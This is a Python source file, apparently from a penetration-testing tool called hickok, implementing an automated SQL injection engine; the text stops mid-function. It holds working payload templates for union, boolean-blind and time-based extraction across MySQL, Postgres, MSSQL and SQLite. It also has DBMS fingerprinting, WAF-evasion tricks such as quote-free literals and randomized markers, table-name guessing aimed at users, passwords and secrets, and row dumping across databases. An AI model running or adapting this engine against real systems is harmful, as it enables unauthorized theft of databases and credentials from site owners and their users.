"""SQL injection exploitation engine — walk a database through an injectable point.

Given an injectable parameter, hickok calibrates the injection, fingerprints the
DBMS, and reads the database out with whichever technique fits:

  * union      — output is reflected: read whole values (and whole tables, via
                 group_concat) in a single request.
  * boolean    — only the page changes: binary-search each character through a
                 TRUE/FALSE oracle (error-forcing when a false page barely moves).
  * time-based — nothing leaks: ask through a conditional sleep and time it.

Enough to fingerprint, enumerate tables/columns and dump rows. Dependency-free
(urllib).
"""

from __future__ import annotations

import difflib
import html as _html
import random
import re
import string
import time
from collections import namedtuple
from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit

# Injection contexts: how to wrap an arbitrary boolean condition C around the
# parameter's normal value V. The right one is found by calibration.
_CONTEXTS = [
    # Plain boolean — works when a false condition visibly changes the page.
    ("numeric",       "{v} AND ({c})-- -"),
    ("single-quote",  "{v}' AND ({c})-- -"),
    ("double-quote",  "{v}\" AND ({c})-- -"),
    ("paren-single",  "{v}') AND ({c})-- -"),
    # Error-forcing — a false condition divides by zero, so even when the page
    # barely changes on a false row, true (page) vs false (error) is night & day.
    ("numeric/error", "{v} AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
    ("single/error",  "{v}' AND (CASE WHEN ({c}) THEN 1 ELSE 1/0 END)=1-- -"),
]

# DBMS detection — a condition true only on that engine.
_FINGERPRINT = [
    ("sqlite",   "sqlite_version() IS NOT NULL"),
    ("mysql",    "@@version_comment IS NOT NULL"),
    ("mssql",    "@@servername IS NOT NULL"),
    ("postgres", "(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)=1"),
]

# Per-DBMS query fragments. {q}=a sub-SELECT, {i}=1-based char index, {t}=table,
# {c}=column, {k}=0-based row offset. Each "*_at" returns the k-th item so the
# engine can page through lists; counts bound the loops.
_PROFILES = {
    "sqlite": {
        "charcode": "unicode(substr(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "sqlite_version()",
        "user":     "''",
        "db":       "'main'",
        "dbs_n":    "(SELECT count(*) FROM pragma_database_list)",
        "db_at":    "(SELECT name FROM pragma_database_list LIMIT 1 OFFSET {k})",
        "tables_n": "(SELECT count(*) FROM sqlite_master WHERE type='table')",
        "table_at": "(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM pragma_table_info('{t}'))",
        "col_at":   "(SELECT name FROM pragma_table_info('{t}') LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "mysql": {
        "charcode": "ascii(substring(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "@@version",
        "user":     "current_user()",
        "db":       "database()",
        "dbs_n":    "(SELECT count(*) FROM information_schema.schemata)",
        "db_at":    "(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {k})",
        "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema=database())",
        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database())",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database() LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "postgres": {
        "charcode": "ascii(substr(({q}),{i},1))",
        "length":   "length(({q}))",
        "version":  "version()",
        "user":     "current_user",
        "db":       "current_database()",
        "dbs_n":    "(SELECT count(*) FROM pg_database)",
        "db_at":    "(SELECT datname FROM pg_database LIMIT 1 OFFSET {k})",
        "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema='public')",
        "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {k})",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' LIMIT 1 OFFSET {k})",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} LIMIT 1 OFFSET {k})",
    },
    "mssql": {
        "charcode": "unicode(substring(({q}),{i},1))",
        "length":   "len(({q}))",
        "version":  "@@version",
        "user":     "system_user",
        "db":       "db_name()",
        "dbs_n":    "(SELECT count(*) FROM sys.databases)",
        "db_at":    "(SELECT name FROM sys.databases ORDER BY name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
        "tables_n": "(SELECT count(*) FROM information_schema.tables)",
        "table_at": "(SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
        "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
        "col_at":   "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' ORDER BY column_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
        "rows_n":   "(SELECT count(*) FROM {t})",
        "cell_at":  "(SELECT {c} FROM {t} ORDER BY 1 OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
    },
}


def _inject(http, url: str, param: str, value: str) -> str:
    """Send the request with `param` set to `value`; return the response body."""
    parts = urlsplit(url)
    q = {k: v[0] for k, v in parse_qs(parts.query, keep_blank_values=True).items()}
    q[param] = value
    return http.get(urlunsplit(parts._replace(query=urlencode(q))))


class Oracle:
    """A yes/no question to the database: ask(condition) -> True/False."""

    def __init__(self, http, url, param, value, template, context, true_text, false_text,
                 console=None):
        self.http = http
        self.url, self.param, self.value = url, param, value
        self.template, self.context = template, context
        self._true, self._false = true_text, false_text
        # Compare on just the region where TRUE and FALSE differ: strip the common
        # prefix/suffix (the identical page chrome). difflib then works on tens of
        # characters instead of thousands — much faster on big pages — and the
        # TRUE/FALSE margin is far wider, so bits are reliable even when the tell is
        # a single line. The threshold below (for anomaly detection in ask) is derived
        # from those trimmed cores, never a fixed cutoff.
        self._pre, self._suf = _common_affixes(true_text, false_text)
        self._tcore = self._core(true_text)
        self._fcore = self._core(false_text)
        self.threshold = min(0.95, (1.0 + _sim(self._tcore, self._fcore)) / 2)
        self.console = console
        self.cache = None        # a sqlcache.Cache once a walk starts (resume/skip)
        self.blocked = 0         # responses matching neither page (WAF / error / filter)
        self.marks = _new_marks()  # per-run UNION markers — no static on-wire fingerprint

    def _core(self, s: str) -> str:
        """The part of a response that actually reacts to the condition — the page
        with the common chrome (shared by the TRUE and FALSE pages) trimmed off."""
        if len(s) <= self._pre + self._suf:
            return s
        return s[self._pre: len(s) - self._suf]

    @property
    def count(self):
        return self.http.count

    def ask(self, condition: str) -> bool:
        payload = self.template.format(v=self.value, c=condition)
        if self.console is not None and self.console.verbose >= 2:
            self.console.trace(f"{self.param}={payload}", level=2)
        body = _inject(self.http, self.url, self.param, payload)
        if not body:                    # timeout / empty: don't bias the search to True
            return False
        body = _strip_payload(body, payload)   # a page that echoes our input adds per-request noise
        core = self._core(body)
        rt = _sim(core, self._tcore)
        rf = _sim(core, self._fcore)
        # A response close to neither calibrated page is a *third* state — an
        # error/WAF/filter block (e.g. a denylisted keyword). Don't let it pass as
        # a clean True/False bit silently: count it, so the walk can warn and fall
        # back. The bit decision itself stays relative (unchanged), so a normal
        # walk is unaffected.
        if rt < self.threshold and rf < self.threshold:
            self.blocked += 1
        return rt >= rf


def _sim(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


def _common_affixes(a, b):
    """(len of common prefix, len of common suffix) shared by two strings — used to
    trim identical page chrome so only the reacting region is compared."""
    n = min(len(a), len(b))
    p = 0
    while p < n and a[p] == b[p]:
        p += 1
    s = 0
    while s < n - p and a[-1 - s] == b[-1 - s]:
        s += 1
    return p, s


def _strip_payload(body, payload):
    """Remove the injected payload (and its HTML-escaped form) from a response.

    Many apps reflect your input back — into a form value, a heading, an error.
    That makes every probe's page slightly different (the payload text differs per
    request), which adds noise to the TRUE/FALSE comparison and flips boolean bits.
    Stripping the payload first leaves only the part of the page that actually
    reacts to the *condition*, so the oracle is stable on reflecting targets."""
    if not body or not payload:
        return body
    out = body.replace(payload, "")
    esc = _html.escape(payload)
    if esc != payload:
        out = out.replace(esc, "")
    return out


def calibrate(http, url, param, value, console=None):
    """Find an injection context where TRUE and FALSE give different responses.

    The tell can be tiny — one line ("Welcome" vs "Invalid") in a big page — so we
    don't use a fixed similarity cutoff (a 0.95 floor missed those). Instead we
    measure the page's own jitter with two identical TRUE requests and accept a
    context only when FALSE sits reliably further from TRUE than that jitter. A
    purely reflected payload (the `1=1`/`1=2` text echoed back) differs by a single
    character, which stays under the margin, so it isn't mistaken for an oracle."""
    for context, tmpl in _CONTEXTS:
        tp = tmpl.format(v=value, c="1=1")
        fp = tmpl.format(v=value, c="1=2")
        t1 = _strip_payload(_inject(http, url, param, tp), tp)
        if not t1:
            continue
        f = _strip_payload(_inject(http, url, param, fp), fp)
        if not f:
            continue
        t2 = _strip_payload(_inject(http, url, param, tp), tp)         # a second TRUE sample
        noise = _sim(t1, t2) if t2 else 1.0          # how much identical requests vary
        signal = _sim(t1, f)                         # how far FALSE sits from TRUE
        margin = max(0.0008, 3.0 * (1.0 - noise))    # must beat the page's own jitter
        if noise - signal > margin:
            # The oracle derives its own TRUE/FALSE threshold from the trimmed cores
            # (see Oracle.__init__); a response far below it on *both* sides is neither —
            # an error/WAF block, flagged in ask() for anomaly detection, never a bit.
            o = Oracle(http, url, param, value, tmpl, context, t1, f, console=console)
            # Confirm with two structurally-distinct true/false pairs. A real oracle
            # answers by *meaning*, so both true forms land on the TRUE page; a page
            # that merely reflects the payload text would not, so this rejects a
            # reflected `1=1`/`1=2` masquerading as an oracle. The pairs are
            # quote-free on purpose, so the check still works against a target that
            # strips quotes from input.
            if (o.ask("1=1") and not o.ask("1=2")
                    and o.ask("2>1") and not o.ask("2<1")):
                o.blocked = 0                        # calibration probes don't count
                return o
    return None


# --- time-based blind: the universal fallback (works when nothing leaks) ----
# Conditional sleep per DBMS — sleeps {n}s only when ({c}) is true.
_SLEEP = {
    "mysql":    "{v}{q} AND IF(({c}),SLEEP({n}),0){cm}",
    "postgres": "{v}{q} AND 1=(CASE WHEN ({c}) THEN (SELECT 1 FROM pg_sleep({n})) ELSE 1 END){cm}",
    "mssql":    "{v}{q};IF(({c})) WAITFOR DELAY '0:0:{n}'{cm}",
    "sqlite":   "{v}{q} AND (CASE WHEN ({c}) THEN sleep({n}) ELSE 0 END)=0{cm}",  # lab only
}


class TimeOracle:
    """A yes/no question answered by the response *time*: a true condition sleeps."""

    def __init__(self, http, url, param, value, dbms, quote, n, threshold, console=None):
        self.http, self.url, self.param, self.value = http, url, param, value
        self.dbms, self.quote, self.n, self.threshold = dbms, quote, n, threshold
        self.context = f"{dbms}/time"
        self.console = console
        self.template = _SLEEP[dbms]
        self.cache = None        # a sqlcache.Cache once a walk starts (resume/skip)

    @property
    def count(self):
        return self.http.count

    def ask(self, condition: str) -> bool:
        payload = self.template.format(v=self.value, q=self.quote, c=condition, n=self.n, cm=_COMMENT)
        if self.console is not None and self.console.verbose >= 2:
            self.console.trace(f"{self.param}={payload}", level=2)
        t0 = time.monotonic()
        _inject(self.http, self.url, self.param, payload)
        return (time.monotonic() - t0) >= self.threshold


def time_calibrate(http, url, param, value, n=2, console=None):
    """Find a DBMS+context whose conditional sleep visibly delays the response."""
    samples = []
    for _ in range(3):
        t0 = time.monotonic()
        _inject(http, url, param, value)
        samples.append(time.monotonic() - t0)
    base, jitter = min(samples), max(samples) - min(samples)
    if jitter > n * 0.5:                      # too noisy to time reliably
        return None
    threshold = base + n * 0.6
    for dbms, tmpl in _SLEEP.items():
        for q in ("", "'", '"', "')"):           # match _quote_for (union/blind also try ') )
            t0 = time.monotonic()
            _inject(http, url, param, tmpl.format(v=value, q=q, c="1=1", n=n, cm=_COMMENT))
            if (time.monotonic() - t0) < threshold:
                continue                      # true didn't delay -> wrong dbms/context
            t0 = time.monotonic()             # confirm a false condition stays fast
            _inject(http, url, param, tmpl.format(v=value, q=q, c="1=2", n=n, cm=_COMMENT))
            if (time.monotonic() - t0) < threshold:
                return TimeOracle(http, url, param, value, dbms, q, n, threshold, console)
    return None


def _quote_for(context: str) -> str:
    """The string-breakout quote implied by a calibrated context."""
    if context.startswith("single"):
        return "'"
    if context.startswith("double"):
        return '"'
    if context.startswith("paren"):
        return "')"
    return ""                                # numeric


def fingerprint(oracle) -> str:
    for name, cond in _FINGERPRINT:
        if oracle.ask(cond):
            return name
    return "sqlite"        # safe fallback (ANSI-ish)


def extract_int(oracle, expr, cap=1 << 21) -> int:
    """The integer value of a SQL expression, by binary search on `>`/`>=`.

    If the oracle carries a cache, a value pulled in a previous run (or before a
    Ctrl-C) is returned straight from it — zero requests — and every freshly
    extracted value is written back, so a walk always resumes where it stopped."""
    cache = getattr(oracle, "cache", None)
    if cache is not None:
        hit = cache.get(expr)
        if hit is not None:
            return hit
    hi = 1
    while hi < cap and oracle.ask(f"({expr}) > {hi}"):
        hi <<= 1
    runaway = hi >= cap        # oracle kept saying ">" to the ceiling — biased (e.g. timeouts)
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle.ask(f"({expr}) >= {mid}"):
            lo = mid
        else:
            hi = mid - 1
    if cache is not None and not runaway:
        cache.put(expr, lo)        # never cache a runaway value — don't poison later runs
    return lo


def _extract_charcode(oracle, expr) -> int:
    """A character's code point, ASCII-first: one probe assumes it's < 128 and a
    7-step binary search reads it (~8 requests), falling back to the full Unicode
    range only for a genuinely non-ASCII character. Most extracted data is ASCII,
    so this roughly halves the requests per character versus searching 0..0x10FFFF.
    Honours the per-value cache like extract_int."""
    cache = getattr(oracle, "cache", None)
    if cache is not None:
        hit = cache.get(expr)
        if hit is not None:
            return hit
    if oracle.ask(f"({expr}) > 127"):                 # non-ASCII: hand off to the full search
        return extract_int(oracle, expr, cap=0x110000)
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle.ask(f"({expr}) >= {mid}"):
            lo = mid
        else:
            hi = mid - 1
    if cache is not None:
        cache.put(expr, lo)
    return lo


def extract_str(oracle, prof, subquery, maxlen=256) -> str:
    """The string value of a sub-SELECT, one character at a time.

    Char codes are bounds-checked before chr(): on a noisy/unreliable oracle (a
    flaky real-world target) the binary search can converge on a junk code — that
    becomes a '?', never a crash."""
    n = min(extract_int(oracle, prof["length"].format(q=subquery)), maxlen)
    out = []
    for i in range(1, n + 1):
        code = _extract_charcode(oracle, prof["charcode"].format(q=subquery, i=i))
        out.append(chr(code) if 0 < code <= 0x10FFFF else "?")
    return "".join(out)


def _list(oracle, prof, count_expr, at_tmpl, **fmt):
    """Yield each value as it's pulled, so a caller can show partial results (and
    keep what it has if the walk is interrupted).

    If extracting the count tripped the anomaly detector — the catalog query was
    filtered/blocked (a WAF), so the count is junk — yield nothing, so the caller
    falls back to by-name guessing instead of chasing a runaway count."""
    before = getattr(oracle, "blocked", 0)
    n = extract_int(oracle, count_expr.format(**fmt))
    if getattr(oracle, "blocked", 0) > before:
        return
    for k in range(n):
        yield extract_str(oracle, prof, at_tmpl.format(k=k, **fmt))


# When the catalog (information_schema) is blocked or empty, fall back to
# probing existence by name — `SELECT count(*) FROM <t>` errors (reads False) if
# the table isn't there, succeeds (True) if it is. No information_schema needed.
_COMMON_TABLES = [
    "users", "user", "admin", "admins", "administrator", "administrators", "accounts",
    "account", "members", "member", "membership", "customers", "customer", "clients",
    "client", "people", "persons", "person", "staff", "employees", "employee",
    "login", "logins", "credentials", "credential", "auth", "authentication",
    "profiles", "profile", "sessions", "session", "settings", "setting", "config",
    "configs", "configuration", "options", "preferences", "news", "articles", "article",
    "posts", "post", "blog", "blogs", "pages", "page", "comments", "comment",
    "products", "product", "orders", "order", "items", "item", "categories", "category",
    "messages", "message", "inbox", "mail", "emails", "logs", "log", "events", "event",
    "tokens", "token", "keys", "secrets", "secret", "passwords", "password", "roles",
    "role", "permissions", "groups", "group", "usergroups", "files", "uploads",
    "media", "images", "documents", "transactions", "payments", "invoices", "cart",
    "carts", "wishlist", "reviews", "ratings", "tags", "data", "info", "details",
    "wp_users", "wp_options", "phpbb_users", "jos_users", "vault",
]
# String literals (db name, table guesses) go in via _strlit on the union path; on
# the blind path the count(*) probe carries no quotes either, so a quote-filtering
# WAF doesn't break name-guessing.
_TABLE_PREFIXES = ["wp_", "phpbb_", "jos_", "joomla_", "drupal_", "tbl_", "tb_", "t_",
                   "app_", "web_", "sys_", "dbo_"]
_PREFIXABLE = ["users", "user", "admin", "accounts", "members", "options", "config",
               "sessions", "posts", "customers", "login", "settings"]


def _candidate_tables(db=None):
    """The name-guessing order: plain common names first (most likely), then the
    same names prefixed with the database name (`<db>_users` — shared-hosting and
    prefixed-schema convention), then common CMS/app table prefixes. De-duplicated,
    likeliest first, so a hit comes early and the request count stays bounded."""
    out, seen = [], set()

    def add(n):
        if n and n not in seen:
            seen.add(n)
            out.append(n)

    for n in _COMMON_TABLES:
        add(n)
    if db:
        add(db)
        for n in _PREFIXABLE:
            add(f"{db}_{n}")
    for pre in _TABLE_PREFIXES:
        for n in _PREFIXABLE:
            add(f"{pre}{n}")
    return out
_COMMON_COLUMNS = [
    "id", "user", "username", "user_name", "name", "login", "email", "mail",
    "pass", "passwd", "password", "pwd", "hash", "secret", "token", "role",
    "is_admin", "admin", "first_name", "last_name", "fullname", "created",
    "updated", "data", "value", "active", "status",
]


def _exists(oracle, expr) -> bool:
    """True if `expr` runs without error — i.e. the table/column is really there.

    A probe for something that isn't there usually errors, which renders as an
    *anomalous* page (a third state, close to neither the TRUE nor the FALSE
    calibration) rather than a clean false. The relative bit decision can tie that
    to True, so we treat any anomaly raised during the probe as "doesn't exist"."""
    before = getattr(oracle, "blocked", 0)
    ans = oracle.ask(f"({expr})>=0")
    if getattr(oracle, "blocked", 0) > before:
        return False
    return ans


def common_tables(oracle, names=None, db=None):
    """Yield the table names that actually exist — a name-guessing path for when
    information_schema is filtered. With `db` known, also tries `<db>_<name>` and
    common CMS/app prefixes (see _candidate_tables)."""
    for t in (names or _candidate_tables(db)):
        if _exists(oracle, f"SELECT count(*) FROM {t}"):
            yield t


def common_columns(oracle, table, names=None):
    """Yield the columns of `table` that exist, by name (no information_schema)."""
    for col in (names or _COMMON_COLUMNS):
        if _exists(oracle, f"SELECT count({col}) FROM {table}"):
            yield col


def databases(oracle, prof):
    return _list(oracle, prof, prof["dbs_n"], prof["db_at"])


def tables(oracle, prof):
    return _list(oracle, prof, prof["tables_n"], prof["table_at"])


def columns(oracle, prof, table):
    return _list(oracle, prof, prof["cols_n"], prof["col_at"], t=table)


def dump(oracle, prof, table, cols, limit=20):
    """Yield rows one at a time (each a list of cell values). A filtered/blocked
    row count yields nothing rather than chasing a runaway."""
    before = getattr(oracle, "blocked", 0)
    rows_n = min(extract_int(oracle, prof["rows_n"].format(t=table)), limit)
    if getattr(oracle, "blocked", 0) > before:
        return
    for k in range(rows_n):
        yield [extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols]


# ===================== multi-database scoping ===========================
# The catalog walk above is scoped to the *current* database. To dump another
# database we re-scope the catalog/data queries to it — but only where one
# injection point can actually reach across databases.

# Databases/schemas that hold the engine's own machinery, not application data —
# skipped by a "dump every database" sweep.
SYSTEM_DBS = {
    "mysql":    {"information_schema", "performance_schema", "mysql", "sys"},
    "postgres": {"information_schema", "pg_catalog", "pg_toast"},
    "mssql":    {"master", "tempdb", "model", "msdb"},
    "sqlite":   set(),
}


def cross_db_supported(dbms):
    """Whether a single injection point can read *other* databases' data. MySQL and
    MSSQL qualify across databases in one query (`db.table`); SQLite (one file) and
    Postgres (one database per connection) can't — only the current one is reachable."""
    return dbms in ("mysql", "mssql")


def scoped_profile(prof, dbms, db):
    """A copy of `prof` with the catalog/data queries re-scoped to database `db`,
    mirroring the per-DBMS templates above. Returns `prof` unchanged when `db` is the
    current database (None) or the engine can't cross databases."""
    if not db or not cross_db_supported(dbms):
        return prof
    p = dict(prof)
    if dbms == "mysql":
        w = "table_schema='" + db + "'"
        p["tables_n"] = "(SELECT count(*) FROM information_schema.tables WHERE " + w + ")"
        p["table_at"] = "(SELECT table_name FROM information_schema.tables WHERE " + w + " LIMIT 1 OFFSET {k})"
        p["cols_n"]   = "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}' AND " + w + ")"
        p["col_at"]   = "(SELECT column_name FROM information_schema.columns WHERE table_name='{t}' AND " + w + " LIMIT 1 OFFSET {k})"
        p["rows_n"]   = "(SELECT count(*) FROM `" + db + "`.{t})"
        p["cell_at"]  = "(SELECT {c} FROM `" + db + "`.{t} LIMIT 1 OFFSET {k})"
    elif dbms == "mssql":
        cat = db + ".information_schema."
        p["tables_n"] = "(SELECT count(*) FROM " + cat + "tables)"
        p["table_at"] = "(SELECT table_name FROM " + cat + "tables ORDER BY table_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
        p["cols_n"]   = "(SELECT count(*) FROM " + cat + "columns WHERE table_name='{t}')"
        p["col_at"]   = "(SELECT column_name FROM " + cat + "columns WHERE table_name='{t}' ORDER BY column_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
        p["rows_n"]   = "(SELECT count(*) FROM " + db + ".dbo.{t})"
        p["cell_at"]  = "(SELECT {c} FROM " + db + ".dbo.{t} ORDER BY 1 OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)"
    return p


def _qualify(dbms, db, table):
    """A table reference qualified to another database, for cross-database dumps."""
    if not db or not cross_db_supported(dbms):
        return table
    if dbms == "mysql":
        return "`" + db + "`." + table
    if dbms == "mssql":
        return db + ".dbo." + table
    return table


def _uscope(dbms, which, db):
    """The union catalog source ('col FROM rest') re-scoped to database `db`."""
    if not db or which == "dbs" or not cross_db_supported(dbms):
        return _UFROM[dbms][which]
    if dbms == "mysql":
        if which == "tables":
            return "table_name FROM information_schema.tables WHERE table_schema='" + db + "'"
        return "column_name FROM information_schema.columns WHERE table_name={t} AND table_schema='" + db + "'"
    # mssql
    if which == "tables":
        return "table_name FROM " + db + ".information_schema.tables"
    return "column_name FROM " + db + ".information_schema.columns WHERE table_name={t}"


# ============================ union-based ===============================
# When the injection point reflects query output, UNION SELECT reads whole
# values (and whole tables, via group_concat) in *one* request instead of
# binary-searching each character — orders of magnitude faster than blind.

_COMMENT = "-- -"          # the comment that swallows the rest of the original query

# UNION markers wrap and separate extracted data in the reflected output. They're
# randomized per run (each Oracle gets its own set), so there's no static string for
# a WAF/IDS to fingerprint hickok by, and a value that happens to contain one run's
# delimiter won't keep colliding on a re-run. The constants below are only the
# fallback for an oracle without its own set; real walks use _new_marks().
_UMARK = "hKx9q"           # delimiter wrapped around extracted data
_UROWSEP = "~r0w~"
_UCOLSEP = "~c0l~"

_Marks = namedtuple("_Marks", "umark rowsep colsep")
_DEFAULT_MARKS = _Marks(_UMARK, _UROWSEP, _UCOLSEP)


def _new_marks() -> _Marks:
    """A fresh, per-run set of UNION markers — tilde-wrapped (rare in page data) with
    a random core, so there's no fixed fingerprint and no cross-run collision."""
    rid = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return _Marks(f"~{rid}m~", f"~{rid}r~", f"~{rid}c~")


def _marks_of(oracle) -> _Marks:
    """The oracle's own markers, falling back to the module defaults (for an oracle
    constructed without a set — the union helpers never assume one is present)."""
    return getattr(oracle, "marks", None) or _DEFAULT_MARKS

# Catalog sources per DBMS: "<column> FROM <rest>".
_UFROM = {
    "sqlite":   {"dbs":    "name FROM pragma_database_list",
                 "tables": "name FROM sqlite_master WHERE type='table'",
                 "cols":   "name FROM pragma_table_info({t})"},
    "mysql":    {"dbs":    "schema_name FROM information_schema.schemata",
                 "tables": "table_name FROM information_schema.tables WHERE table_schema=database()",
                 "cols":   "column_name FROM information_schema.columns WHERE table_name={t} AND table_schema=database()"},
    "postgres": {"dbs":    "datname FROM pg_database",
                 "tables": "table_name FROM information_schema.tables WHERE table_schema='public'",
                 "cols":   "column_name FROM information_schema.columns WHERE table_name={t}"},
    "mssql":    {"dbs":    "name FROM sys.databases",
                 "tables": "table_name FROM information_schema.tables",
                 "cols":   "column_name FROM information_schema.columns WHERE table_name={t}"},
}


def _strlit(dbms, s):
    """A string literal carrying no quote characters — so it survives a WAF that
    strips or filters single quotes (a common filter that otherwise breaks every
    payload). MySQL takes a hex literal (`0x68…`); SQLite/Postgres/MSSQL build the
    string from its character codes. The DBMS renders it back to the original
    text, so reflection/output matching is unchanged."""
    raw = s.encode()
    if not raw:
        return "''"
    if dbms == "mysql":
        return "0x" + raw.hex()
    codes = [str(b) for b in raw]
    if dbms == "sqlite":
        return "char(" + ",".join(codes) + ")"
    if dbms == "postgres":
        return "(" + "||".join(f"chr({c})" for c in codes) + ")"
    return "(" + "+".join(f"char({c})" for c in codes) + ")"      # mssql


def _dequote(dbms, frag):
    """Rewrite every 'literal' in a SQL fragment as a quote-free literal (see
    _strlit), so the *whole* union path survives a single-quote-filtering WAF —
    not just the markers, but the catalog predicates baked into the FROM clauses
    (`type='table'`, `table_schema='public'`, …)."""
    return re.sub(r"'([^']*)'", lambda m: _strlit(dbms, m.group(1)), frag)


def _ucat(dbms, parts):
    if dbms == "mysql":
        return "concat(" + ",".join(parts) + ")"
    return "(" + ("+" if dbms == "mssql" else "||").join(parts) + ")"


def _uagg(dbms, expr, rowsep):
    sep = _strlit(dbms, rowsep)
    if dbms == "mysql":
        return f"group_concat({expr} SEPARATOR {sep})"
    if dbms == "sqlite":
        return f"group_concat({expr},{sep})"
    return f"string_agg(cast({expr} as varchar(4000)),{sep})"   # postgres / mssql


def union_setup(http, oracle, dbms, maxcols=15):
    """Find the column count (ORDER BY) and a reflected column, or None.

    Column count is decided by *relative* similarity, not a fixed cutoff: an
    out-of-range `ORDER BY n` lands on the DBMS's error page, which on some apps is
    only a few percent different from a normal page (a single leaked line) — under
    a 0.95 floor it reads as "valid", so the count overshoots and every UNION probe
    then fails the column-count match. We compare each `ORDER BY n` against a
    deliberately-broken `ORDER BY 9999` (a guaranteed error) as well as the base
    page, and accept n only while it sits closer to the base than to that error.

    The reflected column is then found the textbook way: a single string marker in
    one position with NULL in the rest, trying each position. NULL is type-
    compatible with any column, so this survives strict UNION type-checking
    (Postgres/MSSQL) — putting a string in every column would error there. Markers
    go in as quote-free literals (see `_strlit`), so a target that filters single
    quotes still reflects them."""
    q = _quote_for(oracle.context)
    base = _inject(http, oracle.url, oracle.param, oracle.value)
    err = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY 9999{_COMMENT}")
    ncols = 0
    for n in range(1, maxcols + 1):
        r = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY {n}{_COMMENT}")
        if _sim(r, base) >= _sim(r, err):
            ncols = n
        else:
            break
    if not ncols:
        return None
    umark = _marks_of(oracle).umark
    for refcol in range(ncols):
        mark = f"{umark}{refcol}z"
        cols = ["NULL"] * ncols
        cols[refcol] = _strlit(dbms, mark)
        r = _html.unescape(_inject(http, oracle.url, oracle.param,
                                   f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"))
        if mark in r:
            return ncols, refcol
    return None


def union_value(http, oracle, dbms, ncols, refcol, expr):
    """Extract one SQL expression's value in a single request."""
    inner = f"({expr})"
    if dbms in ("mssql", "postgres"):
        inner = f"cast({inner} as varchar(4000))"
    umark = _marks_of(oracle).umark
    mark = _strlit(dbms, umark)
    cols = ["NULL"] * ncols
    cols[refcol] = _ucat(dbms, [mark, inner, mark])
    q = _quote_for(oracle.context)
    payload = f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"
    body = _html.unescape(_inject(http, oracle.url, oracle.param, payload))
    m = re.search(re.escape(umark) + "(.*?)" + re.escape(umark), body, re.S)
    return m.group(1) if m else ""


def _agg_catalog(value_fn, dbms, marks, which, db=None, **fmt):
    """Read a catalog list as one group_concat'd string through a value channel
    (UNION or error-based) and split it. The catalog SQL and the quote-free encoding
    live here so both channels share them."""
    if "t" in fmt:                       # table name goes in as a quote-free literal
        fmt["t"] = _strlit(dbms, fmt["t"])
    frag = _dequote(dbms, _uscope(dbms, which, db).format(**fmt))   # also the static predicates
    col, _, frm = frag.partition(" FROM ")
    data = value_fn(f"SELECT {_uagg(dbms, col, marks.rowsep)} FROM {frm}")
    return [x for x in data.split(marks.rowsep) if x]


_DUMP_BLOCK = 50           # rows per dump request — keeps each group_concat well under
                           # MySQL's group_concat_max_len (1024 B default) vs truncating
_DUMP_CAP = 10000          # safety bound so a huge/echoing table can't loop forever


def _cell(dbms, c):
    """A dump cell: cast to text and NULL-coalesced to a quote-free empty string. A raw
    NULL would make concat/|| yield NULL for the whole row, and group_concat then skips
    it — silently dropping the row. ('' would re-introduce a quote, breaking quote-free.)
    varchar(max) on MSSQL also dodges string_agg's 8000-byte cap on varchar(4000)."""
    if dbms == "mysql":
        return f"coalesce(cast({c} as char),substr(char(32),2))"
    if dbms == "sqlite":
        return f"coalesce(cast({c} as text),substr(char(32),2))"
    if dbms == "postgres":
        return f"coalesce(cast({c} as varchar),substr(chr(32),2))"
    return f"coalesce(cast({c} as varchar(max)),substring(char(32),2,1))"   # mssql


def _window(dbms, src, n, off):
    """`src` limited to a block of n rows from offset off, ordered for a stable page and
    aliased, so it can be aggregated on its own — the dump reads a table block by block."""
    if dbms == "mssql":
        return f"(SELECT * FROM {src} ORDER BY 1 OFFSET {off} ROWS FETCH NEXT {n} ROWS ONLY) _w"
